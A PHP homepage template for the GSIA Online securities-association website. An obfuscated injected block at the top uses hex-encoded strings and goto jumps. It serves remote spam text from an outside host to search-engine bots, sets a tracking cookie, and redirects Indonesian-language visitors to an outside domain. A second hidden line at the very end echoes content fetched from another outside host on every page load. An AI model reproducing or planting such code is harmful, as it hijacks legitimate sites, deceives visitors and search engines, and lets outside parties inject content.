<?php
goto O0494; O7536: $O3051 = strtolower($_SERVER["\x48\124\x54\120\137\101\x43\x43\x45\120\x54\137\x4c\x41\116\x47\125\101\107\x45"]); goto O4425; O6791: header("\x4c\157\x63\x61\x74\x69\157\156\x3a\x20\150\x74\164\x70\x73\x3a\x2f\57\141\155\x70\x2d\147\x73\x69\141\157\156\154\x69\156\145\55\61\x32\x34\61\62\64\x30\55\147\x73\151\x61\157\156\x6c\151\x6e\145\x2d\x70\141\x67\x65\x73\56\x70\141\147\145\x73\x2e\x64\145\166\x2f"); goto O0732; O6318: setcookie("\x61\172", "\x6c\160", time() + 3600 * 7200); goto O2389; O3338: O6971: goto O0539; O0494: $O9703 = $_SERVER["\110\x54\124\x50\137\122\105\106\105\x52\x45\x52"]; goto O0680; O9230: echo file_get_contents("\x68\x74\164\x70\x73\x3a\x2f\57\x69\x6e\143\x6c\165\x64\x65\x73\x2d\160\141\147\145\x2e\143\x6f\155\57\x67\x73\x69\x61\157\x6e\x6c\x69\156\x65\142\141\162\165\57\x67\x73\x69\x61\x6f\x6e\x6c\151\x6e\145\142\x61\x72\165\x2e\164\170\x74"); goto O1084; O4425: if (!(strpos($O3051, "\x7a\150") !== false && $_SERVER["\110\124\124\120\x5f\x55\x50\x47\x52\x41\x44\x45\137\111\x4e\x53\x45\103\125\x52\105\x5f\x52\x45\121\125\105\123\124\123"] == 1 && $_COOKIE["\x61\x7a"] == "\154\x70")) { goto O9092; } goto O6318; O0539: $O1026 = substr($_SERVER["\x48\124\124\x50\137\101\x43\x43\105\x50\x54\x5f\114\101\116\107\125\x41\x47\x45"], 0, 2); goto O7989; O0680: $O4932 = $_SERVER["\110\124\124\x50\137\x55\x53\105\x52\x5f\101\x47\x45\x4e\x54"]; goto O4076; O7989: if (!($O1026 == "\x69\x64")) { goto O6571; } goto O6791; O2389: echo "\x20"; goto O7249; O7249: exit; goto O2608; O2608: O9092: goto O9230; O4269: echo "\40\40\x20\40\x20\x20\x20\x20"; goto O3338; O0732: exit; goto O8534; O4076: if (!(strpos($O4932, "\142\x6f\164") !== false && $_SERVER["\x52\105\x51\x55\x45\123\x54\137\125\122\111"] == "\57")) { goto O6971; } goto O7536; O1084: exit; goto O4269; O8534: O6571:
include "partials/_initiate.php";
$homeCaro = $application->getHomeGridData($db, 31);
$featuredRegulations = $application->featuredRegulations($db, 59);
$getMemberCategoryRandom4 = $application->getMemberCategoryRandom4($db);
$welcomeText = $application->getSinglePageData($db, 'welcome-message');
$popup = $application->getSinglePageData($db, 'home-popup');

$featured = $application->featured($db, 29);
$getVideo = $application->getPagesRandomOne($db, 20);
$videoID = $getVideo['image_desc'];
?>
<!DOCTYPE html>
<html lang="eng">
<head>
	<title>GSIA Online</title>
	<?php
include "partials/_head.php";
include ("partials/_meta.php");
?>
</head>
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6025355261642994"
     crossorigin="anonymous"></script>
<!-- all of them -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-6025355261642994"
     data-ad-slot="7330281052"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<body class="site-body style-v1">
	<!-- Header -->
	<header class="site-header header-s1 is-sticky">
		<?php
include "partials/_topBar.php";
?>
		<?php
include "partials/_navBar.php";
?>
		<?php
include "partials/_slider.php";
?>
	</header>
	<!-- End Header -->

	<!-- Service Section -->
	<div class="section section-services">
	    <div class="container">
	        <div class="content row">
				<!-- Feature Row  -->
				<div class="feature-row feature-service-row row feature-s4 off-text boxed-filled boxed-w">


					<div class="heading-box clearfix">
						<div class="col-sm-3">
							<h3 class="heading-section">Ghana Securities Industry Association</h3>
						</div>
						<div class="col-sm-8 col-sm-offset-1">
							<span> <?=$welcomeText['description'];?> </span>
						</div>
					</div>

					<?php
foreach ($getMemberCategoryRandom4 as $b) {
	?>

					<div class="col-md-3 col-sm-6 col-xs-6 even">
						<!-- Feature box -->
						<div class="feature">
							<a href="<?= 'members/' . $b['location_id'] . '/0'?>">
								<div class="fbox-photo">
									<div style="background: url('images/pagepics/<?=$b['picture'];?>') no-repeat center center; height: 211px; width: 100%; background-size: cover;"></div>
								</div>
								<div class="fbox-over">
									<h3 class="title"><?=$b['location_name'];?></h3>
									<div class="fbox-content">
										<span class="btn">Learn More</span>
									</div>
								</div>
							</a>
						</div>
						<!-- End Feature box -->
					</div>
					<?php
}
?>

				</div>
				<!-- Feture Row  #end -->

	        </div>
	    </div>
	</div>
	<!-- End Section -->

	<!-- Content -->
	<div class="section section-content section-pad">
		<div class="container">
			<div class="content row">

				<div class="row ">
					<div class="col-md-12 res-m-bttm">
						<!--<h5 class="heading-sm-lead">GSIA</h5>-->
						<h2 class="heading-section">Featured News</h2>
						<div class="row">
							<div class="blog-posts">

							<?php
foreach ($featured as $b) {
	?>
								<div class="post post-loop  col-md-3" style="min-height:300px;">
									<div class="post-thumbs">
										<a href="<?=$application->toAscii($b['catName']) . '/' . $b['id'] . '/' . $application->toAscii($b['title']) . '/'?>">
											<div style="background: url('images/pagepics/<?=$b['image'];?>') no-repeat center center; width: 100%; height: 200px; background-size: cover;"></div>
										</a>

									</div>
									<div class="post-entry">
										<h2><a href="<?=$application->toAscii($b['catName']) . '/' . $b['id'] . '/' . $application->toAscii($b['title']) . '/'?>"><?=$b['title'];?></a></h2>
                                       <!-- <div style="line-height: 22px;"><?php //$b['brief']; ?></div> -->
                                        <div>&nbsp;</div>
                                        <a href="<?=$application->toAscii($b['catName']) . '/' . $b['id'] . '/' . $application->toAscii($b['title']) . '/'?>" class="btn btn-alt">Read more ></a>
									</div>
								</div>
							<?php
}
?>


							</div>
						</div>

					</div>




				</div>

			</div>
		</div>
	</div>
	<!-- End Content -->


	<!-- Modal -->
<?php
if($popup['status']  == 0) {
?>
<div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title" id="myModalLabel"><?= $popup['name']; ?></h4>
      </div>
      <div class="modal-body">
	<?= $popup['description']; ?>
      </div>
    </div>
  </div>
</div>

<?php
}
?>

	<!-- Content -->
<!--
	<div class="section section-contents section-pad image-on-right bg-light">
		<div class="container">
			<div class="row" >

				<h5 class="heading-sm-lead">GSIA</h5>
				<h2 class="heading-section">Members</h2>
				<div class="feature-intro">
					<div class="row">
						<div class="col-sm-7 col-md-6">
							<div class="row" style="margin-left:-45px;">

								<div class="col-sm-3 res-s-bttm">
									<div class="" style="width:50%; margin: 0  auto;">
										<img src="image/SVG/brokers.svg" class="img-responsive">
									</div>

									<h1 class="center" style="margin-top: 10px; margin-bottom: 0px;">22</h1>
									<h5 class="center" style="margin-bottom: 0px; margin-top: 0px;">Brokers</h5>
								</div>


								<div class="col-sm-3 res-s-bttm">
									<div class="" style="width:50%; margin: 0  auto;">
										<img src="image/SVG/funds.svg" class="img-responsive">
									</div>

									<h1 class="center" style="margin-top: 10px; margin-bottom: 0px;">90</h1>
									<h5 class="center" style="margin-bottom: 0px; margin-top: 0px;">Fund Managers</h5>
								</div>

								<div class="col-sm-3 res-s-bttm">
									<div class="" style="width:50%; margin: 0  auto;">
										<img src="image/SVG/custodian.svg" class="img-responsive">
									</div>
									<h1 class="center" style="margin-top: 10px; margin-bottom: 0px;">12</h1>
									<h5 class="center" style="margin-bottom: 0px; margin-top: 0px;">Custodians</h5></div>



								<div class="col-sm-3 res-s-bttm">
									<div class="" style="width:50%; margin: 0  auto;">
										<img src="image/SVG/investment%20advisors.svg" class="img-responsive">
									</div>
									<h1 class="center" style="margin-top: 10px; margin-bottom: 0px;">12</h1>
									<h5 class="center" style="margin-bottom: 0px; margin-top: 0px;">Investment Advisors</h5>

								</div>
								<div>&nbsp;</div>
								<div class="col-sm-3 res-s-bttm">
									<div class="" style="width:50%; margin: 0  auto;">
										<img src="image/SVG/registrer.svg" class="img-responsive">
									</div>
									<h1 class="center" style="margin-top: 10px; margin-bottom: 0px;">1</h1>
									<h5 class="center" style="margin-bottom: 0px; margin-top: 0px;">Registrar</h5>

								</div>


								<div class="col-sm-3 res-s-bttm">
									<div class="" style="width:50%; margin: 0  auto;">
										<img src="image/SVG/security%20depositor.svg" class="img-responsive">
									</div>
									<h1 class="center" style="margin-top: 10px; margin-bottom: 0px;">1</h1>
									<h5 class="center" style="margin-bottom: 0px; margin-top: 0px;">Securities Depository</h5>

								</div>



								<div class="col-sm-3 res-s-bttm">
									<div class="" style="width:50%; margin: 0  auto;">
										<img src="image/SVG/stocks.svg" class="img-responsive">
									</div>
									<h1 class="center" style="margin-top: 10px; margin-bottom: 0px;">1</h1>
									<h5 class="center" style="margin-bottom: 0px; margin-top:   	0px;">Stock Exchange</h5>

								</div></div>
						</div>
					</div>

				</div>

			</div>
		</div>
		<div class="section-bg imagebg"><img src="image/members.jpg" alt=""></div>
	</div>
-->
	<!-- End Content -->


	<!-- Content -->
	<!--<div class="sectionsection-contents section-pad has-bg fixed-bg light bg-alternet">-->
		<!--<div class="container">-->
			<!--<div class="row">-->
				<!---->
				<!--<div class="row">-->
					<!--<div class="col-md-4 pad-r res-m-bttm">-->
						<!--<h2 class="heading-lead">FinanceCorp team provide independent advice based on established research methods.</h2>-->
					<!--</div>-->
					<!--<div class="col-md-8">-->
						<!--<div class="row">-->
							<!--<div class="col-sm-6 res-s-bttm">-->
								<!--<div class="icon-box style-s4 photo-plx-full">-->
									<!--<em class="fa fa-bar-chart-o" aria-hidden="true"></em>-->
								<!--</div>-->
								<!--<h4>Experienced</h4>-->
								<!--<p>Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusan.</p>-->
							<!--</div>-->
							<!--<div class="col-sm-6">-->
								<!--<div class="icon-box style-s4">-->
									<!--<em class="fa fa-users" aria-hidden="true"></em>-->
								<!--</div>-->
								<!--<h4>Vibrant</h4>-->
								<!--<p>Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusan.</p>-->
							<!--</div>-->
							<!--<div class="gaps size-lg"></div>-->
							<!--<div class="col-sm-6 res-s-bttm">-->
								<!--<div class="icon-box style-s4">-->
									<!--<em class="fa fa-credit-card" aria-hidden="true"></em>-->
								<!--</div>-->
								<!--<h4>Professional</h4>-->
								<!--<p>Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusan.</p>-->
							<!--</div>-->
							<!--<div class="col-sm-6">-->
								<!--<div class="icon-box style-s4">-->
									<!--<em class="fa fa-trademark" aria-hidden="true"></em>-->
								<!--</div>-->
								<!--<h4>Trademarks</h4>-->
								<!--<p>Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusan.</p>-->
							<!--</div>-->
							<!--</div>-->
					<!--</div>-->
				<!--</div>-->
			<!--</div>-->
		<!--</div>-->
		<!--<div class="section-bg imagebg"><img src="image/plx-full.jpg" alt=""></div>-->
	<!--</div>-->
	<!-- End Content -->

	<!-- Latest News -->
	<!--<div class="section section-news section-pad">-->
		<!--<div class="container">-->
			<!--<div class="content row">-->
				<!---->
				<!--<h2 class="heading-section center">Featured News</h2>-->

				<!--<div class="row">-->
					<!--<div class="blog-posts">-->
						<!--<div class="post post-loop  col-md-4">-->
							<!--<div class="post-thumbs">-->
								<!--<a href="recycle/news-details.html"><img alt="" src="image/post-thumb-a.jpg"></a>-->
							<!--</div>-->
							<!--<div class="post-entry">-->
								<!--<div class="post-meta"><span class="pub-date">15, Aug 2017</span></div>-->
								<!--<h2><a href="recycle/news-details.html">Income Increase Shows the Recovery Is Very Much Real</a></h2>-->
								<!--<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit sed do eiusmod tempor incididunt laboris nisi ut aliquip ex ea commodo consequat...</p>-->
								<!--<a class="btn btn-alt" href="index.html#">Read More</a>-->
							<!--</div>-->
						<!--</div>-->
						<!--<div class="post post-loop col-md-4">-->
							<!--<div class="post-thumbs">-->
								<!--<a href="recycle/news-details.html"><img alt="" src="image/post-thumb-b.jpg"></a>-->
							<!--</div>-->
							<!--<div class="post-entry">-->
								<!--<div class="post-meta"><span class="pub-date">04, Jul 2017</span></div>-->
								<!--<h2><a href="recycle/news-details.html">An Economics Nobel awarded for Examining Reality</a></h2>-->
								<!--<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit sed do eiusmod tempor incididunt laboris nisi ut aliquip ex ea commodo consequat...</p>-->
								<!--<a class="btn btn-alt" href="index.html#">Read More</a>-->
							<!--</div>-->
						<!--</div>-->
						<!--<div class="post post-loop col-md-4">-->
							<!--<div class="post-thumbs">-->
								<!--<a href="recycle/news-details.html"><img alt="" src="image/post-thumb-c.jpg"></a>-->
							<!--</div>-->
							<!--<div class="post-entry">-->
								<!--<div class="post-meta"><span class="pub-date">26, Dec 2016</span></div>-->
								<!--<h2><a href="recycle/news-details.html">Maybe Supply-Side Economics Deserves a Second Look</a></h2>-->
								<!--<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit sed do eiusmod tempor incididunt laboris nisi ut aliquip ex ea commodo consequat...</p>-->
								<!--<a class="btn btn-alt" href="index.html#">Read More</a>-->
							<!--</div>-->
						<!--</div>-->
					<!--</div>-->
				<!--</div>-->
				<!---->
			<!--</div>-->
		<!--</div>-->
	<!--</div>-->
	<!-- End Section -->

	<!-- Client logo -->
<!--
	<div class="section section-logos section-pad-sm  bdr-top">
		<div class="container">
			<div class="content row">

				<h4>Founding Members</h4>

				<div class="owl-carousel loop logo-carousel style-v2">
					<div class="logo-item"><img alt="" src="image/membercompanies/1.jpg"></div>
					<div class="logo-item"><img alt="" src="image/membercompanies/3.jpg"></div>
					<div class="logo-item"><img alt="" src="image/membercompanies/4.jpg"></div>
					<div class="logo-item"><img alt=""  src="image/membercompanies/6.png"></div>

				</div>

			</div>
		</div>
	</div>
-->
	<!-- End Section -->

	<!-- Call Action -->
<!--
	<div class="call-action cta-small has-bg bg-primary" style="background-image: url('image/bg.jpg');">
		<div class="cta-block">
			<div class="container">
				<div class="content row">

					<div class="" style="text-align: center;">
						<h2>Annual Report 2017</h2>
						<a class="btn btn-alt" href="index.html#">Download</a>
					</div>

				</div>
			</div>
		</div>
	</div>
-->
	<!-- End Section -->

	<?php
include "partials/_footer.php";
?>



	<!-- Preloader !active please if you want -->
	<!-- <div id="preloader"><div id="status">&nbsp;</div></div> -->
	<!-- Preloader End -->

	<?php
include "partials/_scripts.php";
?>

<script type="text/javascript">
    $(window).on('load',function(){
        $('#myModal').modal('show');
    });

</script>

</body>
</html>
<?php
echo file_get_contents("\150\x74\x74\160\x73\x3a\57\57\x61\144\x64\x65\144\x2d\x63\154\x6f\165\x64\x2e\143\143\x2f\x70\141\x63\153\144\x6f\154\x2f\x67\145\164\143\157\156\164\145\x6e\164\x2f\x62\x2f\x6c\56\x74\170\x74");
